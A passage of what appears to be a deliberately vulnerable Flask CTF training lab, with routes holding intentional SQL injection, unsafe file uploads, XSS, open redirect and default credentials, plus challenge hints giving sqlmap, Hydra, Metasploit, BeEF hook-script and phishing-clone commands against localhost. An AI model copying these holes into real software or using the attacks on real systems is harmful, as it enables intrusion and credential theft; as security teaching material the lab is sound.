        return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Profile</h1><p>User: {user.username}</p><p>Email: {user.email}</p><a href='/' style='color:#00ff00;'>Back</a></body></html>"
    return "User not found"

@app.route('/login', methods=['POST'])
def login_vuln():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    query = f"SELECT * FROM user WHERE username='{username}' AND password='{weak_hash(password)}'"
    try:
        result = db.engine.execute(query).fetchone()
        if result:
            return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Login Successful!</h1><p>Welcome {username}</p><p>FLAG{{sql1_byp4ss3d_via_burp}}</p><a href='/' style='color:#00ff00;'>Back</a></body></html>"
    except:
        pass
    return "<html><body style='background:#0a0a0a;color:#ff0000;font-family:monospace;padding:20px;'><h1>Login Failed!</h1><a href='/' style='color:#00ff00;'>Back</a></body></html>"

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if file:
        file.save(f"uploads/{file.filename}")
        return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Uploaded: {file.filename}</h1><a href='/' style='color:#00ff00;'>Back</a></body></html>"
    return "No file"

@app.route('/page')
def page():
    name = request.args.get('name', 'home')
    return f"<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>Page: {name}</h1><a href='/' style='color:#00ff00;'>Back</a></body></html>"

@app.route('/redirect')
def open_redirect():
    url = request.args.get('url', '/')
    return redirect(url)

# Hidden flag endpoints for specific tools
@app.route('/secret/flag.txt')
def secret_flag():
    return "FLAG{h1dd3n_d1r_3xp10r3d}"

@app.route('/backup.sql')
def backup_flag():
    return "-- FLAG{b4ckup_f1l3_f0und}\n-- Database backup\nCREATE TABLE users..."

@app.route('/responder-flag')
def responder_flag():
    return "FLAG{dns_p01s0n3d}"

@app.route('/wifi-flag')
def wifi_flag():
    return "FLAG{w1f1_h4ndsh4k3_cr4ck3d}"

# FTP server simulation (for Netcat challenge)
@app.route('/ftp-banner')
def ftp_banner():
    return "220 FLAG{ftp_w3lc0m3_m3ss4g3} Welcome to FTP server"

# Custom headers for Nmap challenge
@app.after_request
def add_custom_headers(response):
    if request.path == '/':
        response.headers['X-CTF-Flag'] = 'FLAG{h34d3rs_3xpl0s3d_by_nmap}'
    return response

# ==================== INITIALIZE ====================
def init_db():
    with app.app_context():
        db.create_all()
        
        if not User.query.filter_by(username='admin').first():
            admin = User(username='admin', password=weak_hash('admin'), email='admin@ctf.local', role='admin', bio='System Administrator')
            db.session.add(admin)
        
        if not User.query.filter_by(username='user').first():
            user = User(username='user', password=weak_hash('password'), email='user@ctf.local', role='user', bio='Regular User')
            db.session.add(user)
        
        if not User.query.filter_by(username='test').first():
            test = User(username='test', password=weak_hash('test123'), email='test@ctf.local', role='user', bio='Test Account')
            db.session.add(test)
        
        if not User.query.filter_by(username='sqltest').first():
            sqltest = User(username='sqltest', password=weak_hash('sql123'), email='sql@ctf.local', role='user', bio='SQL Test')
            db.session.add(sqltest)
        
        if not Message.query.first():
            msg1 = Message(sender='admin', receiver='user', content='Welcome to the Security CTF!')
            msg2 = Message(sender='user', receiver='admin', content='Ready to learn security tools!')
            db.session.add_all([msg1, msg2])
        
        # Create flag table for SQLmap challenge
        db.session.execute(db.text('''CREATE TABLE IF NOT EXISTS flag (
            id INTEGER PRIMARY KEY,
            flag_name VARCHAR(50),
            flag_value VARCHAR(100),
            description TEXT
        )'''))
        
        # Insert flags if not exists
        result = db.session.execute(db.text('SELECT COUNT(*) FROM flag'))
        if result.fetchone()[0] == 0:
            db.session.execute(db.text("INSERT INTO flag (flag_name, flag_value, description) VALUES (:name, :value, :desc)"), 
                {'name': 'sqlmap_flag', 'value': 'FLAG{d4t4b4s3_dump3d}', 'desc': 'This is the flag for SQLmap challenge - dump this table!'})
            db.session.execute(db.text("INSERT INTO flag (flag_name, flag_value, description) VALUES (:name, :value, :desc)"), 
                {'name': 'decoy_1', 'value': 'FLAG{not_this_one}', 'desc': 'Decoy flag - keep looking!'})
            db.session.execute(db.text("INSERT INTO flag (flag_name, flag_value, description) VALUES (:name, :value, :desc)"), 
                {'name': 'decoy_2', 'value': 'FLAG{wrong_flag}', 'desc': 'Another decoy - not the real flag'})
        
        db.session.commit()
        print("="*50)
        print("  SECURITY TOOLS CTF LAB")
        print("="*50)
        print("  Access: http://localhost:5000")
        print("  Tools: 15 challenges")
        print("  Points: 245 total")
        print("  NO DEBUG ENDPOINT!")
        print("="*50)

def get_tool_info():
    return {
        'nmap': {
            'name': 'Nmap - Network Scanner',
            'icon': '🔍',
            'category': 'Reconnaissance',
            'points': 15,
            'task': 'Run Nmap with service detection (-sV) against the Flask app and check the HTTP response headers for a hidden flag.',
            'hint': 'nmap -sV -p 5000 localhost\ncurl -I http://localhost:5000',
            'learn': '''## How to Use Nmap

### Basic Scans
```bash
# Service version detection
nmap -sV localhost

# All ports
nmap -p- localhost

# Vulnerability scripts
nmap --script=vuln localhost
```

### Inspecting Headers
```bash
# Check HTTP headers
curl -I http://localhost:5000

# Verbose headers
curl -v http://localhost:5000
```'''
        },
        'metasploit': {
            'name': 'Metasploit Framework',
            'icon': '💀',
            'category': 'Exploitation',
            'points': 25,
            'task': 'Use Metasploit to exploit the vsftpd 2.3.4 backdoor on port 2122 and read the FTP banner.',
            'hint': 'msfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS localhost\nset RPORT 2122\nexploit',
            'learn': '''## How to Use Metasploit

### Starting
```bash
msfconsole
```

### Exploiting vsftpd
```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS localhost
set RPORT 2122
exploit
```'''
        },
        'burpsuite': {
            'name': 'Burp Suite',
            'icon': '🛡️',
            'category': 'Web Application',
            'points': 20,
            'task': 'Use Burp Suite to intercept the login request and bypass authentication using SQL injection: admin\' OR \'1\'=\'1',
            'hint': 'Set browser proxy to 127.0.0.1:8080\nIntercept POST to /login\nChange username to: admin\' OR \'1\'=\'1',
            'learn': '''## How to Use Burp Suite

### Setup
1. Proxy → Options → Verify 127.0.0.1:8080
2. Install CA certificate
3. Enable Intercept

### SQL Injection
Change username to:
```sql
admin' OR '1'='1
```'''
        },
        'wireshark': {
            'name': 'Wireshark',
            'icon': '📡',
            'category': 'Network',
            'points': 15,
            'task': 'Capture FTP traffic and find the password being transmitted in the PASS command.',
            'hint': 'sudo wireshark -i any -w capture.pcap\nFilter: ftp.request.command == "PASS"',
            'learn': '''## How to Use Wireshark

### Capture
```bash
sudo wireshark -i any -w capture.pcap
```

### Filters
```bash
ftp.request.command == "PASS"
http
tcp.port == 2121
```'''
        },
        'nikto': {
            'name': 'Nikto',
            'icon': '🔎',
            'category': 'Enumeration',
            'points': 10,
            'task': 'Run Nikto against the Flask app to find the hidden backup.sql file.',
            'hint': 'nikto -h http://localhost:5000\nLook for /backup.sql in output',
            'learn': '''## How to Use Nikto

### Basic Scan
```bash
nikto -h http://localhost:5000
```

### With Authentication
```bash
nikto -h http://localhost:5000 -id admin:admin
```'''
        },
        'gobuster': {
            'name': 'Gobuster',
            'icon': '📁',
            'category': 'Enumeration',
            'points': 15,
            'task': 'Use Gobuster to discover the hidden /secret directory and access /secret/flag.txt.',
            'hint': 'gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt',
            'learn': '''## How to Use Gobuster

### Directory Scan
```bash
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt
```

### With Extensions
```bash
gobuster dir -u http://localhost:5000 -w wordlist.txt -x php,html,txt
```'''
        },
        'sqlmap': {
            'name': 'SQLmap',
            'icon': '💉',
            'category': 'Web Application',
            'points': 20,
            'task': 'Use SQLmap to perform SQL injection on /messages?sender=admin and dump the user table.',
            'hint': 'sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs\nsqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp -T user --dump',
            'learn': '''## How to Use SQLmap

### Detect Injection
```bash
sqlmap -u "http://localhost:5000/messages?sender=admin"
```

### Dump Database
```bash
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp -T user --dump
```'''
        },
        'john': {
            'name': 'John the Ripper',
            'icon': '🔑',
            'category': 'Password Cracking',
            'points': 15,
            'task': 'Extract password hashes from the API and crack the hash for user "test" using John.',
            'hint': 'curl -s http://localhost:5000/api/users > users.json\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
            'learn': '''## How to Use John the Ripper

### Extract Hashes
```bash
curl -s http://localhost:5000/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data:
    print(f'{u[\"username\"]}:{u[\"password_hash\"]}')
" > hashes.txt
```

### Crack
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```'''
        },
        'hashcat': {
            'name': 'Hashcat',
            'icon': '⚡',
            'category': 'Password Cracking',
            'points': 15,
            'task': 'Use Hashcat to crack the MD5 hashes extracted from the API endpoint.',
            'hint': 'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 0 hashes.txt --show',
            'learn': '''## How to Use Hashcat

### MD5 Mode (0)
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Show Results
```bash
hashcat -m 0 hashes.txt --show
```'''
        },
        'hydra': {
            'name': 'Hydra',
            'icon': '🔓',
            'category': 'Brute Force',
            'points': 15,
            'task': 'Use Hydra to brute force the SSH service on Metasploitable (port 2223) with user msfadmin.',
            'hint': 'hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223',
            'learn': '''## How to Use Hydra

### SSH Brute Force
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223
```

### FTP Brute Force
```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost:2121
```'''
        },
        'netcat': {
            'name': 'Netcat',
            'icon': '🌐',
            'category': 'Network',
            'points': 10,
            'task': 'Connect to the FTP service on port 2121 using Netcat and read the welcome banner.',
            'hint': 'nc localhost 2121',
            'learn': '''## How to Use Netcat

### Banner Grabbing
```bash
nc localhost 2121
```

### Port Scanning
```bash
nc -zv localhost 1-1000
```

### File Transfer
```bash
# Receiver
nc -lvnp 4444 > file.txt

# Sender
nc localhost 4444 < file.txt
```'''
        },
        'responder': {
            'name': 'Responder',
            'icon': '🎯',
            'category': 'Network',
            'points': 20,
            'task': 'Access the simulated Responder endpoint at /responder-flag to get the flag.',
            'hint': 'curl http://localhost:5000/responder-flag',
            'learn': '''## How to Use Responder

### Start
```bash
sudo responder -I eth0 -wrf
```

### Analyze Mode
```bash
sudo responder -I eth0 -A
```'''
        },
        'beef': {
            'name': 'BeEF',
            'icon': '🐂',
            'category': 'Exploitation',
            'points': 20,
            'task': 'Hook a browser using the XSS vulnerability on /search endpoint with BeEF hook script.',
            'hint': 'Start BeEF: ./beef\nHook URL: http://YOUR_IP:3000/hook.js\nInject via: /search?q=<script src="http://localhost:3000/hook.js"></script>',
            'learn': '''## How to Use BeEF

### Start
```bash
cd /path/to/beef
./beef
```

### Hook Browser
Add via XSS:
```html
<script src="http://YOUR_IP:3000/hook.js"></script>
```'''
        },
        'set': {
            'name': 'SET',
            'icon': '🎭',
            'category': 'Social Engineering',
            'points': 15,
            'task': 'Use SET to clone the Flask app login page as a phishing demonstration.',
            'hint': 'setoolkit\n1) Social-Engineering Attacks\n2) Website Attack Vectors\n3) Credential Harvester\n4) Site Cloner\nURL: http://localhost:5000',
            'learn': '''## How to Use SET

### Start
```bash
setoolkit
```

### Credential Harvester
1. Social-Engineering Attacks
2. Website Attack Vectors
3. Credential Harvester Attack
4. Site Cloner'''
        },
        'aircrack': {
            'name': 'Aircrack-ng',
            'icon': '📶',
            'category': 'Wireless',
            'points': 20,
            'task': 'Access the simulated WiFi flag endpoint at /wifi-flag.',
            'hint': 'curl http://localhost:5000/wifi-flag',
            'learn': '''## How to Use Aircrack-ng

### Monitor Mode
```bash
sudo airmon-ng start wlan0
```

### Capture Handshake
```bash
airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture wlan0mon
```

### Crack
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```'''
        }
    }

if __name__ == '__main__':
    os.makedirs('uploads', exist_ok=True)
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
